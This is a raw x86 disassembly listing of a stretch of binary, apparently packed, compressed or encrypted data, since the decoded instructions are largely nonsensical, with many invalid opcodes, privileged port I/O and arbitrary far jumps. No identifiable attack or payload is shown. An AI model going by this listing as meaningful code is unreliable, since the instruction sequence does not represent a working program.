  413eaf:	sahf   
  413eb0:	push   edx
  413eb1:	pusha  
  413eb2:	push   0x5e
  413eb4:	arpl   WORD PTR [ecx+0x67],dx
  413eb7:	ja     0x413e76
  413eb9:	test   eax,0xf9db79ce
  413ebe:	stc    
  413ebf:	jbe    0x413ef8
  413ec1:	or     al,0xbf
  413ec3:	mov    bh,0x16
  413ec5:	cmc    
  413ec6:	xchg   ebx,eax
  413ec7:	repnz sbb eax,0xd9189011
  413ecd:	sbb    eax,0x3ddc61df
  413ed2:	cld    
  413ed3:	push   edi
  413ed4:	mov    cl,0xde
  413ed6:	sar    al,cl
  413ed8:	xchg   ebp,esp
  413eda:	mov    al,ds:0x1526c3dc
  413edf:	pushf  
  413ee0:	inc    esp
  413ee1:	pop    ebp
  413ee2:	out    dx,eax
  413ee3:	(bad)  
  413ee4:	loop   0x413eb7
  413ee6:	out    0xb3,eax
  413ee8:	inc    esp
  413ee9:	sub    cl,BYTE PTR [eax-0x3a]
  413eec:	mov    ch,0xce
  413eee:	lea    eax,ss:[ebp-0x38b783cd]
  413ef5:	inc    esp
  413ef6:	fs add al,0x18
  413ef9:	mov    eax,0xef524134
  413efe:	jmp    0xbe1806c9
  413f03:	sbb    esp,edi
  413f05:	les    eax,FWORD PTR [esi+0x412db19d]
  413f0b:	push   eax
  413f0c:	call   FWORD PTR [edi]
  413f0e:	inc    ecx
  413f0f:	les    edx,FWORD PTR [ebx-0x4f]
  413f12:	in     al,dx
  413f13:	and    ecx,DWORD PTR [ebx+ebx*1]
  413f16:	in     al,0xcc
  413f18:	nop/reserved BYTE PTR [ecx-0x2e]
  413f1c:	xor    ch,dl
  413f1e:	arpl   bp,cx
  413f20:	in     al,0xb1
  413f22:	call   0x2083:0x6b36b324
  413f29:	cmp    dl,BYTE PTR fs:[edx-0x11d8bf59]
  413f30:	dec    ebp
  413f31:	xor    al,0xc7
  413f33:	aam    0x6a
  413f35:	dec    ebp
  413f36:	cwde   
  413f37:	pop    edx
  413f38:	fwait
  413f39:	add    eax,0x45d599c8
  413f3e:	in     eax,dx
  413f3f:	es in  eax,dx
  413f41:	into   
  413f42:	mov    WORD PTR [ecx+0x59],cs
  413f45:	loopne 0x413fa9
  413f47:	cmp    al,0x5c
  413f49:	mov    dl,0x39
  413f4b:	in     eax,0xdc
  413f4d:	arpl   WORD PTR [ebx+0x455b80c6],cx
  413f53:	pop    ebx
  413f54:	rol    DWORD PTR [bp+di],cl
  413f57:	dec    edx
  413f58:	shr    BYTE PTR [edx],0xbb
  413f5b:	in     al,dx
  413f5c:	stc    
  413f5d:	xchg   edx,eax
  413f5e:	shl    bl,0xef
  413f61:	add    DWORD PTR [eax],0xe51106fc
  413f67:	js     0x413fb0
  413f69:	and    edx,DWORD PTR [esi-0xd76e586]
  413f6f:	loopne 0x413f12
  413f71:	in     eax,dx
  413f72:	sub    ebx,edx
  413f74:	sbb    esp,ebp
  413f76:	cdq    
  413f77:	mov    ds,edx
  413f79:	ins    DWORD PTR es:[edi],dx
  413f7a:	jle    0x413fc0
  413f7c:	dec    edx
  413f7d:	pop    ds
  413f7e:	inc    ecx
  413f7f:	or     dl,BYTE PTR [eax+0x525ad0cd]
  413f85:	jnp    0x413f9d
  413f87:	push   es
  413f88:	sar    DWORD PTR [edi-0x2cca85dd],cl
  413f8e:	repnz or esp,DWORD PTR [ebp+0x39d24029]
  413f95:	loope  0x414005
  413f97:	add    ch,dh
  413f99:	xchg   ecx,eax
  413f9a:	stos   BYTE PTR es:[edi],al
  413f9b:	ss ds and ebp,esp
  413f9f:	cmp    BYTE PTR [bp+0x2022],cl
  413fa4:	int    0x9b
  413fa6:	outs   dx,BYTE PTR ds:[esi]
  413fa7:	mov    esi,0x25f880c
  413fac:	dec    edx
  413fad:	add    ch,BYTE PTR [edx+0x18]
  413fb0:	sbb    al,0xe0
  413fb2:	add    edx,DWORD PTR [esi-0x1a]
  413fb5:	pop    ecx
  413fb6:	pop    es
  413fb7:	enter  0x985b,0x5e
  413fbb:	adc    al,0xfe
  413fbd:	ret    
  413fbe:	sbb    edx,edi
  413fc0:	xlat   BYTE PTR ds:[ebx]
  413fc1:	jns    0x413f88
  413fc3:	loop   0x413f5b
  413fc5:	and    eax,0x75cf8aca
  413fca:	ret    0x8349
  413fcd:	pop    edx
  413fce:	xchg   edi,eax
  413fcf:	mov    ds:0xcb9cdc9c,al
  413fd4:	pop    ecx
  413fd5:	mov    al,0x7
  413fd7:	aas    
  413fd8:	push   ecx
  413fd9:	jo     0x413fbf
  413fdb:	call   0x1e9240e4
  413fe0:	outs   dx,DWORD PTR ds:[esi]
  413fe1:	cld    
  413fe2:	inc    esi
  413fe3:	sbb    DWORD PTR [edi-0x6d],ebp
  413fe6:	jo     0x414025
  413fe8:	out    0xf3,al
  413fea:	dec    edi
  413feb:	pop    es
  413fec:	xor    esi,ebx
  413fee:	jmp    0xa592:0x1f81a177
  413ff5:	test   BYTE PTR [edi],bl
  413ff7:	push   esp
  413ff8:	lds    ecx,FWORD PTR [ebx]
  413ffa:	imul   eax,DWORD PTR [ecx],0xa59ba564
  414000:	lds    ebx,FWORD PTR [edi+edx*2+0x62]
  414004:	aam    0x66
  414006:	mov    ebx,0xd96451f
  41400b:	std    
  41400c:	cli    
  41400d:	popa   
  41400e:	nop
  41400f:	jle    0x413ff5
  414011:	and    edi,DWORD PTR [ecx+ebp*2+0xd65f024]
  414018:	shl    DWORD PTR cs:[ecx-0x38],0x2f
  41401d:	and    al,dh
  41401f:	scas   eax,DWORD PTR es:[edi]
  414020:	pop    ebx
  414021:	rcl    DWORD PTR [eax],0x64
  414024:	aas    
  414025:	int    0x5c
  414027:	push   ds
  414028:	ret    0x2dcf
  41402b:	xchg   edx,eax
  41402c:	add    DWORD PTR [esi+0x2873373],eax
  414032:	jg     0x41406d
  414034:	xlat   BYTE PTR ds:[ebx]
  414035:	fs pop ss
  414037:	out    dx,al
  414038:	adc    BYTE PTR [eax+0x4aa0be50],bl
  41403e:	dec    ebp
  41403f:	dec    ecx
  414040:	outs   dx,DWORD PTR ds:[esi]
  414041:	pop    eax
  414042:	or     eax,0xaa3e18e0
  414047:	imul   esi,DWORD PTR [ebx+ebx*4-0x2ea9a0b9],0xffffffec
  41404f:	dec    edx
  414050:	inc    esp
  414051:	or     dl,dh
  414053:	cmp    al,0xae
  414055:	mov    edi,0xbce3df6b
  41405a:	ins    DWORD PTR es:[edi],dx
  41405b:	popa   
  41405c:	imul   edi,DWORD PTR [ebp-0x6de595ac],0x8ae0767c
  414066:	and    DWORD PTR [eax+0x4d],esi
  414069:	dec    ebx
  41406a:	loopne 0x414038
  41406c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41406d:	sbb    eax,0x6566f2e4
  414072:	lea    ebx,[edi]
  414074:	jle    0x414023
  414076:	mov    WORD PTR [ebp-0x21f69197],ss
  41407c:	mov    cl,0x52
  41407e:	out    dx,eax
  41407f:	test   BYTE PTR [eax-0x75],cl
  414082:	(bad)  
  414083:	mov    ch,0x7a
  414085:	call   0x6693:0x56271eaa
  41408c:	push   esi
  41408d:	fcom   DWORD PTR [ebx-0x1d]
  414090:	dec    edx
  414091:	(bad)  
  414093:	sub    bl,BYTE PTR [ecx]
  414095:	mov    eax,0x8ad89ee9
  41409a:	adc    eax,0x776f1671
  41409f:	mov    esp,0x7294220b
  4140a4:	dec    edi
  4140a5:	dec    esp
  4140a6:	cmp    BYTE PTR [eax-0x11],0x45
  4140aa:	loope  0x41411a
  4140ac:	sub    DWORD PTR [esi+edx*4],eax
  4140af:	scas   eax,DWORD PTR es:[edi]
  4140b0:	pusha  
  4140b1:	inc    esp
  4140b2:	int    0xa8
  4140b4:	adc    BYTE PTR [ecx+eax*8+0x10596295],dl
  4140bb:	out    dx,al
  4140bc:	cmp    eax,0x47262a03
  4140c1:	mov    al,ds:0x5821a568
  4140c6:	xlat   BYTE PTR ds:[ebx]
  4140c7:	and    ch,dl
  4140c9:	adc    al,BYTE PTR [esi+0x2f]
  4140cc:	jae    0x4140a4
  4140ce:	pop    ds
  4140cf:	lock jp 0x414066
  4140d2:	in     eax,dx
  4140d3:	inc    edx
  4140d4:	(bad)  
  4140d5:	aaa    
  4140d6:	inc    ebx
  4140d7:	sbb    BYTE PTR ds:0x7cb67c0d,0x6e
  4140de:	and    DWORD PTR [eax-0x2a30da2b],ebx
  4140e4:	pop    esp
  4140e5:	test   eax,edx
  4140e7:	push   ds
  4140e8:	xchg   edx,eax
  4140e9:	add    al,0x23
  4140eb:	mov    edx,0xc1951ac1
  4140f0:	out    dx,eax
  4140f1:	aad    0x8d
  4140f3:	xchg   ecx,eax
  4140f4:	sar    BYTE PTR gs:[edx-0x6fab611b],0xb4
  4140fc:	neg    ebp
  4140fe:	enter  0xf1c9,0x3b
  414102:	in     eax,0x27
  414104:	pop    esi
  414105:	push   cs
  414106:	adc    esi,0x1e3a911a
  41410c:	inc    ebp
  41410d:	mov    dh,0x1b
  41410f:	jae    0x4140a8
  414111:	pop    esi
  414112:	dec    ebx
  414113:	iret   
  414114:	xchg   ebx,eax
  414115:	inc    ebx
  414116:	cdq    
  414117:	ds xchg ebx,eax
  414119:	push   es
  41411a:	pop    edx
  41411b:	je     0x4140cf
  41411d:	mov    dh,0xda
  41411f:	cmp    ebx,DWORD PTR [ebp+0x53]
  414122:	push   esi
  414123:	mov    bl,0xce
  414125:	out    0x67,al
  414127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414128:	test   BYTE PTR [ecx-0x4949bb79],0xfe
  41412f:	or     bl,BYTE PTR [edi]
  414131:	test   cl,0xb3
  414134:	add    ah,BYTE PTR [ebp-0x71]
  414137:	cmp    bl,bl
  414139:	fisubr DWORD PTR [ebx+esi*8+0x637589af]
  414140:	mov    eax,ds:0x5d15dd67
  414145:	(bad)  
  414146:	cs ret 
  414148:	sub    eax,0xf08ba0ac
  41414d:	jmp    0x8883a1c8
  414152:	leave  
  414153:	pop    ebp
  414154:	popa   
  414155:	sbb    ebx,DWORD PTR [edi]
  414157:	add    DWORD PTR [bp+di],ebx
  41415a:	jmp    0x41416d
  41415c:	aaa    
  41415d:	rcl    BYTE PTR [edi-0x1e93ba32],0xf8
  414164:	ret    0xcf73
  414167:	and    ecx,DWORD PTR [ecx]
  414169:	js     0x414103
  41416b:	pop    esi
  41416c:	xchg   ch,al
  41416e:	ja     0x4141cd
  414170:	enter  0xa139,0xd6
  414174:	mov    ch,0xcb
  414176:	xor    al,0xd4
  414178:	or     bh,BYTE PTR [edi-0x122168b4]
  41417e:	lods   al,BYTE PTR ds:[esi]
  41417f:	lahf   
  414180:	lea    edx,[eax]
  414182:	pop    ss
  414183:	int3   
  414184:	aad    0xbb
  414186:	dec    ebp
  414187:	outs   dx,DWORD PTR ds:[esi]
  414188:	in     al,dx
  414189:	inc    ecx
  41418a:	ja     0x4141d0
  41418c:	jecxz  0x4141b9
  41418e:	cs adc eax,0x957e3086
  414194:	pop    es
  414195:	test   edi,esi
  414197:	sbb    ebp,esi
  414199:	mov    eax,0x528fb0a5
  41419e:	jg     0x414201
  4141a0:	inc    ecx
  4141a1:	(bad)  
  4141a2:	mov    cl,0xa8
  4141a4:	dec    esi
  4141a5:	inc    ecx
  4141a6:	fisub  DWORD PTR [esi+0x42]
  4141a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141aa:	outs   dx,BYTE PTR ds:[esi]
  4141ab:	pop    ebp
  4141ac:	pushf  
  4141ad:	out    dx,al
  4141ae:	mov    esi,DWORD PTR [esi+0x3043ffe0]
  4141b4:	call   0xc00f:0x756493d0
  4141bb:	jle    0x414176
  4141bd:	imul   ecx,DWORD PTR [ecx],0x5a6f3682
  4141c3:	cmp    esp,DWORD PTR [edi+0x1c8b7ee5]
  4141c9:	test   eax,0xda4d4e2f
  4141ce:	add    BYTE PTR [ebp+ebp*8+0x6b],0xc6
  4141d3:	aad    0x99
  4141d5:	aaa    
  4141d6:	mov    edx,0x4a4977ec
  4141db:	aad    0xc3
  4141dd:	dec    esi
  4141de:	addr16 inc eax
  4141e0:	xor    al,0x56
  4141e2:	jp     0x414168
  4141e4:	imul   ebp,DWORD PTR [ebx+ebp*8+0x648dccea],0xb4a2a79e
  4141ef:	xor    eax,0x876a160
  4141f4:	sub    al,0xfe
  4141f6:	inc    eax
  4141f7:	shl    edx,0x16
  4141fa:	xor    eax,eax
  4141fc:	pop    es
  4141fd:	leave  
  4141fe:	cmp    BYTE PTR [ecx-0x1c13118b],dl
  414204:	lock inc ecx
  414206:	pop    esp
  414207:	xlat   BYTE PTR ds:[ebx]
  414208:	and    eax,0x412f63c2
  41420d:	loopne 0x4141a1
  41420f:	and    al,0xa
  414211:	fnstcw WORD PTR [edi]
  414213:	test   DWORD PTR [edi-0x37],ecx
  414216:	stos   BYTE PTR es:[edi],al
  414217:	sub    BYTE PTR [edx-0x70],0x83
  41421b:	or     ecx,DWORD PTR [ebp-0x2d8bf9d1]
  414221:	ja     0x414239
  414223:	std    
  414224:	cmc    
  414225:	push   ss
  414226:	mov    bh,0x38
  414228:	xor    edi,esi
  41422a:	sub    DWORD PTR [edi+0x24],eax
  41422d:	bnd jo 0x414284
  414230:	or     eax,0xc72f47db
  414235:	lods   eax,DWORD PTR ds:[esi]
  414236:	les    edx,FWORD PTR [edi-0x37a14e8a]
  41423c:	test   eax,0x16382de9
  414241:	mov    ds:0x8c72c247,al
  414246:	mov    DWORD PTR [esi+0xa],ebx
  414249:	leave  
  41424a:	mov    al,ds:0x91115e58
  41424f:	call   0xd809:0x9716081a
  414256:	inc    esp
  414257:	mov    ds:0xa7a0364,eax
  41425c:	add    DWORD PTR [ecx+0x1c],0xffffffb3
  414260:	xchg   edx,esp
  414262:	mov    eax,ds:0xd9a59e77
  414267:	in     eax,0x44
  414269:	push   cs
  41426a:	js     0x4142db
  41426c:	push   edi
  41426d:	push   es
  41426e:	cmp    al,0x98
  414270:	push   0xc6e26d0d
  414275:	and    BYTE PTR ds:0x35b00781,0x5b
  41427c:	jg     0x4142d7
  41427e:	shl    BYTE PTR [eax+0x57bbdf28],1
  414284:	adc    BYTE PTR [esi+edx*1-0x1109b614],cl
  41428b:	mov    edi,0x654f8584
  414290:	in     eax,dx
  414291:	scas   al,BYTE PTR es:[edi]
  414292:	and    edx,0x90bca780
  414298:	cdq    
  414299:	(bad)  
  41429a:	mov    ebx,0x15f3d379
  41429f:	pop    esi
  4142a0:	sub    BYTE PTR [ebp+0x2],cl
  4142a3:	rol    BYTE PTR [eax-0x2bca6139],1
  4142a9:	mov    ch,0x16
  4142ab:	retf   
  4142ac:	sub    edx,DWORD PTR [edx-0x3f]
  4142af:	pop    edx
  4142b0:	pop    ecx
  4142b1:	jne    0x414241
  4142b3:	jb     0x414326
  4142b5:	scas   al,BYTE PTR es:[edi]
  4142b6:	cld    
  4142b7:	dec    cx
  4142b9:	jl     0x41427d
  4142bb:	fadd   QWORD PTR [esi]
  4142bd:	pop    ds
  4142be:	and    DWORD PTR [edi+0x7f],0x331d801f
  4142c5:	(bad)  
  4142c6:	xor    eax,0x3da6f403
  4142cb:	aad    0x79
  4142cd:	xchg   DWORD PTR [ebp*8-0x10459586],ebx
  4142d4:	add    esp,edi
  4142d6:	add    al,0x3c
  4142d8:	cmc    
  4142d9:	dec    ecx
  4142da:	pop    esp
  4142db:	sub    ebp,DWORD PTR es:[ebx]
  4142de:	mov    al,ds:0x11585a34
  4142e3:	dec    ebp
  4142e4:	sub    edx,ebp
  4142e6:	out    0xf6,al
  4142e8:	push   es
  4142e9:	fadd   QWORD PTR [esi-0x49769ecf]
  4142ef:	shl    DWORD PTR [edi-0x7d194491],cl
  4142f5:	ja     0x4142c2
  4142f7:	inc    ebp
  4142f8:	cmp    ah,0x3b
  4142fb:	xor    BYTE PTR [edi],al
  4142fd:	xchg   bp,ax
  4142ff:	test   dl,ah
  414301:	dec    ebx
  414302:	jb     0x41436f
  414304:	push   esp
  414305:	out    0xf4,al
  414307:	in     eax,0xb8
  414309:	lahf   
  41430a:	or     bh,BYTE PTR [eax]
  41430c:	sti    
  41430d:	jmp    0xe009:0xa039fcdb
  414314:	pop    ss
  414315:	xor    dl,BYTE PTR [ebx]
  414317:	jmp    0x6ed9:0xfa5b9034
  41431e:	ret    0xed8
  414321:	mov    ch,0xd8
  414323:	add    DWORD PTR [ecx-0x77d6ba98],ecx
  414329:	xor    al,0xec
  41432b:	mov    dh,0xaf
  41432d:	jb     0x414382
  41432f:	cmp    BYTE PTR [ebx],ch
  414331:	sbb    BYTE PTR [esp+edx*4+0x11],ch
  414335:	cwde   
  414336:	jbe    0x4142ed
  414338:	iret   
  414339:	mov    BYTE PTR [esi+0x4c],dl
  41433c:	mov    WORD PTR [ebp-0x10426181],ss
  414342:	dec    edi
  414343:	jl     0x41437a
  414345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414346:	push   0x6860380
  41434b:	pop    edx
  41434c:	and    DWORD PTR ds:0x5bb30d45,0x5b3459c6
  414356:	mov    cl,0x65
  414358:	in     eax,0x41
  41435a:	test   al,0xd5
  41435c:	xchg   ecx,eax
  41435d:	jo     0x4143a2
  41435f:	ja     0x41432c
  414361:	sub    DWORD PTR [ebp-0x4d5f381a],esi
  414367:	loop   0x4143b6
  414369:	loop   0x4143bd
  41436b:	sti    
  41436c:	out    dx,al
  41436d:	adc    DWORD PTR [ecx+0x291784e],esp
  414373:	mov    eax,ds:0x41817fb9
  414378:	xchg   ebp,eax
  414379:	imul   ecx,DWORD PTR [esp+eax*8],0x5b
  41437d:	aad    0x84
  41437f:	das    
  414380:	imul   edi,DWORD PTR fs:[esi-0x4f],0xffffffb3
  414385:	jl     0x414325
  414387:	xchg   ebx,eax
  414388:	into   
  414389:	add    dh,cl
  41438b:	call   0xac7:0x12b1a2e5
  414392:	out    dx,eax
  414393:	pop    ebx
  414394:	outs   dx,DWORD PTR ds:[esi]
  414395:	je     0x414411
  414397:	and    al,0x31
  414399:	sub    al,al
  41439b:	ja     0x414384
  41439d:	mov    bl,0xd9
  41439f:	add    DWORD PTR [ebx-0x18],esp
  4143a2:	jecxz  0x414337
  4143a4:	jl     0x414404
  4143a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143a7:	sbb    BYTE PTR [ebx],bl
  4143a9:	push   es
  4143aa:	jmp    0x2d38:0xb5edbb50
  4143b1:	add    BYTE PTR [esp+eax*2],ah
  4143b4:	(bad)  
  4143b5:	(bad)  
  4143b6:	or     eax,0xaa596912
  4143bb:	shl    bh,cl
  4143bd:	jmp    0xf8b7:0xc62539f2
  4143c4:	xchg   ebp,eax
  4143c5:	pop    ss
  4143c6:	inc    edx
  4143c7:	loope  0x4143f1
  4143c9:	mov    ebx,0x6ee05f2f
  4143ce:	xor    al,0xfb
  4143d0:	jno    0x414451
  4143d2:	sbb    al,0x32
  4143d4:	jmp    0x4143ac
  4143d6:	mov    ebx,0xd222cf80
  4143db:	data16 loope 0x414425
  4143de:	sub    ebx,edx
  4143e0:	shr    al,1
  4143e2:	mov    bh,0x26
  4143e4:	loope  0x4143ac
  4143e6:	mov    dl,0xce
  4143e8:	jp     0x414402
  4143ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143eb:	xchg   esp,eax
  4143ec:	(bad)  
  4143ed:	fbstp  TBYTE PTR [eax+ebx*8+0x37]
  4143f1:	jbe    0x414465
  4143f3:	xrelease xchg BYTE PTR [edx+esi*1],bl
  4143f7:	mov    dl,BYTE PTR [ebx-0x3e]
  4143fa:	pop    edi
  4143fb:	loopne 0x4143bc
  4143fd:	fdivr  QWORD PTR [ecx-0x64]
  414400:	dec    BYTE PTR [esi+0x64f5d14c]
  414406:	push   es
  414407:	add    DWORD PTR [edi],ebx
  414409:	stos   DWORD PTR es:[edi],eax
  41440a:	push   ds
  41440b:	mov    ds:0x4526a472,eax
  414410:	jmp    0x41442c
  414412:	push   esi
  414413:	push   esp
  414414:	inc    ecx
  414415:	aam    0x3
  414417:	mov    cs,WORD PTR [edi+0x24435826]
  41441d:	inc    edi
  41441e:	jg     0x4143ac
  414420:	nop
  414421:	out    dx,al
  414422:	mov    esi,0xa4bd72ca
  414427:	pusha  
  414428:	fdivp  st(0),st
  41442a:	arpl   WORD PTR ds:0xd6267401,di
  414430:	aad    0xbf
  414432:	mov    eax,ds:0xdb42649b
  414437:	sbb    al,0xde
  414439:	fstp   QWORD PTR [edx]
  41443b:	stos   BYTE PTR es:[edi],al
  41443c:	mov    esp,0x1f95f44b
  414441:	sbb    BYTE PTR [esi-0x6b],ah
  414444:	push   ss
  414445:	jns    0x41444d
  414447:	int3   
  414448:	fld    st(7)
  41444a:	ss jge 0x41449e
  41444d:	mov    ecx,0xcaac4179
  414452:	xor    ch,dh
  414454:	cmp    edi,DWORD PTR [ecx+0x67682e9d]
  41445a:	push   ss
  41445b:	pop    eax
  41445c:	iret   
  41445d:	sub    DWORD PTR [ebp-0x4e8fa3c8],esi
  414463:	ficom  WORD PTR [edx+edi*8]
  414466:	daa    
  414467:	pop    edx
  414468:	pusha  
  414469:	inc    ebp
  41446a:	call   0x88bbe131
  41446f:	mov    ch,dl
  414471:	and    BYTE PTR [edx-0x49],al
  414474:	sti    
  414475:	call   0xd73d349b
  41447a:	(bad)  
  41447b:	leave  
  41447c:	xchg   ebx,eax
  41447d:	je     0x414473
  41447f:	aas    
  414480:	jbe    0x414481
  414482:	das    
  414483:	repz xor eax,0x1eeebbc2
  414489:	enter  0xf136,0x20
  41448d:	adc    bh,BYTE PTR [edi+0x1a]
  414490:	in     eax,0x30
  414492:	outs   dx,DWORD PTR ds:[esi]
  414493:	(bad)  
  414494:	in     al,0x57
  414496:	retf   
  414497:	(bad)  
  414499:	test   BYTE PTR [ecx],ch
  41449b:	rcr    BYTE PTR [ebp-0x76],1
  41449e:	ja     0x4144c8
  4144a0:	add    DWORD PTR [eax+0x6aa912c9],esi
  4144a6:	in     al,dx
  4144a7:	mov    al,0x13
  4144a9:	mov    al,ds:0xb8fb9db0
  4144ae:	cli    
  4144af:	je     0x414498
  4144b1:	sbb    esp,DWORD PTR [ecx]
  4144b3:	push   ss
  4144b4:	(bad)  
  4144b5:	jmp    0x41448c
  4144b7:	lods   eax,DWORD PTR ds:[esi]
  4144b8:	push   ds
  4144b9:	mov    dl,0x22
  4144bb:	jns    0x414472
  4144bd:	mov    ecx,0x62ca9995
  4144c2:	cmp    esi,0x18
  4144c5:	xchg   DWORD PTR [esi+0x6b488fa1],ebx
  4144cb:	mov    eax,ds:0x38b4cd40
  4144d0:	push   cs
  4144d1:	adc    bl,al
  4144d3:	dec    ebx
  4144d4:	and    eax,0x2b739aab
  4144d9:	rcl    eax,cl
  4144db:	lods   al,BYTE PTR ds:[esi]
  4144dc:	nop
  4144dd:	(bad)  
  4144de:	push   ds
  4144df:	in     eax,dx
  4144e0:	cmp    eax,0x120abd05
  4144e5:	cwde   
  4144e6:	repz adc bl,BYTE PTR [edx+0x7f]
  4144ea:	or     ah,BYTE PTR [ecx-0x5caa4056]
  4144f0:	pop    ecx
  4144f1:	sub    DWORD PTR [ecx-0xfcb5a6f],ebx
  4144f7:	xchg   esi,eax
  4144f8:	jo     0x414505
  4144fa:	push   0x47935e84
  4144ff:	and    cl,BYTE PTR [edx+0x55]
  414502:	ja     0x414574
  414504:	pop    ecx
  414505:	mov    edx,DWORD PTR [eax-0xb]
  414508:	mov    edi,0x19fba53e
  41450d:	mov    cl,0xe6
  41450f:	or     ebx,esi
  414511:	call   0x7300:0x73099104
  414518:	cld    
  414519:	call   0x911d:0x99ce6ee8
  414520:	adc    ebp,ebx
  414522:	icebp  
  414523:	push   cs
  414524:	jae    0x4144cd
  414526:	push   0x1fdedfe7
  41452b:	xor    al,BYTE PTR [edx-0x38]
  41452e:	les    esp,FWORD PTR [esi-0x4a8f7a99]
  414534:	aad    0x9d
  414536:	xchg   ecx,eax
  414537:	pop    ebx
  414538:	pop    ss
  414539:	push   es
  41453a:	adc    ebp,edi
  41453c:	sar    ah,0x28
  41453f:	push   0x3c
  414541:	es data16 int3 
  414544:	(bad)  
  414545:	mov    ah,0xeb
  414547:	repz pop ebx
  414549:	pop    ds
  41454a:	xchg   edi,eax
  41454b:	mov    ecx,DWORD PTR [eax+ebp*4-0x31]
  41454f:	add    BYTE PTR [esi+eiz*2-0x65bc5583],cl
  414556:	nop
  414557:	inc    edi
  414558:	dec    eax
  414559:	push   esi
  41455a:	ja     0x41453b
  41455c:	jge    0x414501
  41455e:	lds    ecx,FWORD PTR [edx]
  414560:	mov    edx,0x6c8309c3
  414565:	or     eax,0xe8fb0037
  41456a:	fisubr WORD PTR [ecx+edx*8+0x4a409f2c]
  414571:	lea    esi,[edx-0x37]
  414574:	xchg   BYTE PTR [ebx],ch
  414576:	sub    al,0x36
  414578:	or     BYTE PTR [ebx+0x3f],cl
  41457b:	fdiv   DWORD PTR [ebx+edx*2+0x2a]
  41457f:	mov    BYTE PTR [ecx],bh
  414581:	mov    ch,0xa7
  414583:	mov    cl,0x4d
  414585:	dec    eax
  414586:	aad    0x56
  414588:	mov    edi,0x12dc1bf6
  41458d:	or     cl,bl
  41458f:	rol    BYTE PTR [edx],1
  414591:	and    al,0xf0
  414593:	test   al,0x34
  414595:	add    eax,0xd6c5dc39
  41459a:	xchg   ebx,eax
  41459b:	push   ds
  41459c:	dec    esp
  41459e:	dec    eax
  41459f:	and    eax,0xf15f080f
  4145a4:	mov    edi,0x9eda537
  4145a9:	push   edx
  4145aa:	pop    ebp
  4145ab:	lahf   
  4145ac:	aad    0x4
  4145ae:	out    dx,al
  4145af:	or     al,0x65
  4145b1:	sahf   
  4145b2:	jle    0x41457c
  4145b4:	bound  ebx,QWORD PTR [eax-0x3e]
  4145b7:	jl     0x4145d1
  4145b9:	add    BYTE PTR [esi+ebx*4+0x78387b27],bl
  4145c0:	jle    0x4145df
  4145c2:	je     0x4145e3
  4145c4:	lods   al,BYTE PTR ds:[esi]
  4145c5:	jbe    0x414587
  4145c7:	jle    0x4145c6
  4145c9:	inc    edi
  4145ca:	add    ah,BYTE PTR [eax+0x3fc33d07]
  4145d0:	add    DWORD PTR [esi+eiz*2],edi
  4145d3:	ror    DWORD PTR [edi],1
  4145d5:	push   edx
  4145d6:	jne    0x414567
  4145d8:	(bad)  
  4145d9:	std    
  4145da:	xor    BYTE PTR [eax+0x7e],0xac
  4145de:	cdq    
  4145df:	mov    ecx,0xcc0d97ad
  4145e4:	in     eax,0x77
  4145e6:	imul   eax,DWORD PTR [ebx+0x70710598],0x47b91ed1
  4145f0:	lea    ebp,ds:[ecx-0x3197c2a3]
  4145f7:	jbe    0x414592
  4145f9:	push   edi
  4145fa:	push   ebx
  4145fb:	dec    edi
  4145fc:	lock lds eax,FWORD PTR [ecx-0x5f]
  414600:	in     eax,0x2a
  414602:	xor    al,0xae
  414604:	mov    dh,0x81
  414606:	icebp  
  414607:	repz (bad) 
  414609:	fld    QWORD PTR [esi-0x40]
  41460c:	push   esi
  41460d:	fsubr  st(7),st
  41460f:	cmp    edi,DWORD PTR [edi-0x80]
  414612:	ret    0x1acb
  414615:	bound  esp,QWORD PTR [edx]
  414617:	mov    al,ds:0x4885eff
  41461c:	push   cs
  41461d:	das    
  41461e:	inc    esi
  41461f:	jl     0x414609
  414621:	cmc    
  414622:	add    DWORD PTR [ebx+0x15],ecx
  414625:	imul   esi,DWORD PTR [ebx-0x195278e8],0x3899a098
  41462f:	mov    ah,0x23
  414631:	mov    ah,0x22
  414633:	xor    BYTE PTR [ecx-0x3028b83a],dl
  414639:	add    DWORD PTR es:[ebp+0x6b617246],esi
  414640:	push   cs
  414641:	test   DWORD PTR [eax],0xc625ad44
  414647:	cdq    
  414648:	test   al,0x1f
  41464a:	cmp    DWORD PTR [ecx-0x36de79c8],esi
  414650:	cmp    bl,BYTE PTR [eax-0x2]
  414653:	mov    edi,esi
  414655:	push   ecx
  414656:	push   eax
  414657:	ret    0x93b6
  41465a:	dec    ebp
  41465b:	fisub  DWORD PTR [edx-0xe]
  41465e:	and    al,0xc0
  414660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414661:	popa   
  414662:	enter  0xdbcf,0x1c
  414666:	inc    esp
  414667:	add    al,0x34
  414669:	and    DWORD PTR [ebx+0x7d57482c],eax
  41466f:	cmp    edi,eax
  414671:	scas   al,BYTE PTR es:[edi]
  414672:	loopne 0x414607
  414674:	enter  0x3af7,0xc1
  414678:	out    dx,eax
  414679:	fnstcw WORD PTR [eax-0x5e]
  41467c:	arpl   cx,bp
  41467e:	mov    ch,0xdd
  414680:	xor    cl,BYTE PTR ds:0x6b7c1b40
  414686:	xchg   edx,eax
  414687:	jg     0x4146e2
  414689:	into   
  41468a:	jne    0x414708
  41468c:	clc    
  41468d:	adc    al,0x91
  41468f:	data16 clc 
  414691:	aad    0xc4
  414693:	ret    
  414694:	pushf  
  414695:	lock jae 0x414691
  414698:	inc    edi
  414699:	xchg   esp,eax
  41469a:	mov    ecx,0x5fe6ee29
  41469f:	loope  0x414671
  4146a1:	hlt    
  4146a2:	add    al,0xb7
  4146a4:	int    0x73
  4146a6:	jg     0x4146bf
  4146a8:	jnp    0x41468b
  4146aa:	icebp  
  4146ab:	mov    dh,0x81
  4146ad:	shl    BYTE PTR [eax+0x55],cl
  4146b0:	mov    ebx,0xf06d0d18
  4146b5:	xor    edi,DWORD PTR [ecx]
  4146b7:	mov    ebp,0x81b70084
  4146bc:	mov    ch,0xd0
  4146be:	xor    al,0x28
  4146c0:	jp     0x41468f
  4146c2:	leave  
  4146c3:	imul   ebp,DWORD PTR [ebp-0x78],0xffffff9f
  4146c7:	aam    0xbc
